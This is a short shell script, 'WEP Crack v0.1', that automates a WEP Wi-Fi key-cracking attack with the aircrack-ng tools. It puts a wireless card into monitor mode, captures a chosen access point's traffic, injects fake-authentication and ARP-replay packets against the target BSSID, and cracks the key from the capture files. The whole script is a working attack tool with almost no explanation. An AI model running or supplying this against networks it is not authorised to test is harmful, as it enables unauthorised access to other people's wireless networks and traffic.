#!/bin/sh

echo "WEP Crack v0.1 by benoror@gmail.com\n\n"

if [ $# -lt 1 ]; then
	echo "Usage: $0 [step#1-5] [options]"
	echo "-----------------------------------"
	echo "1) Air Scan:   $0 1 [device]"
	echo "2) AP Dump:    $0 2 [bssid] [channel] [essid]"
	echo "3) Air Play:   $0 3 [bssid] [essid]"
	echo "4) Air Crack:  $0 4"
	echo "4) Stop All:   $0 5"
else
	if [ $1 = '1' ]; then
		sudo /etc/rc.d/wicd stop &&
		sudo airmon-ng stop $2 &&
		sudo airmon-ng start $2 &&
		sudo airodump-ng -t WEP mon0
	elif [ $1 = '2' ]; then
		sudo airodump-ng -c $3 -w $4 --bssid $2 mon0
	elif [ $1 = '3' ]; then
		sudo aireplay-ng -1 0 -a $2 -e $3 mon0 &&
		sudo aireplay-ng -3 -b $2 mon0
	elif [ $1 = '4' ]; then
		sudo aircrack-ng *.cap
	elif [ $1 = '5' ]; then
		sudo airmon-ng stop mon0 &&
		sudo /etc/rc.d/wicd start
	fi
fi
